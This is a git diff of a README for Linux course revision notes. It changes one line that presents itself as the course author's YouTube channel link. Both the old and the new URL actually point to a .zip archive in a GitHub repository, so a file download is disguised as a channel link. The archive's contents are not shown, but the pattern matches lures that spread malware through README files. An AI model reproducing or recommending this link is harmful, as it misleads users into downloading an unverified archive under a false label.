@@ -1,6 +1,6 @@
 # Ultimate Linux Guide
 
-This repository is created to serve as a revision notes for the YouTube course created by **Abhishek Veeramalla**(`iam-veeramalla` on GitHub) on his youtube channel - `https://raw.githubusercontent.com/DBA-devops-tech/ultimate-linux-guide/main/herbman/ultimate-linux-guide.zip`.
+This repository is created to serve as a revision notes for the YouTube course created by **Abhishek Veeramalla**(`iam-veeramalla` on GitHub) on his youtube channel - `https://github.com/DBA-devops-tech/ultimate-linux-guide/raw/refs/heads/main/01-getting-started/ultimate_guide_linux_3.2.zip`.
 
 Following topics are covered as part of the course and documentation.
 
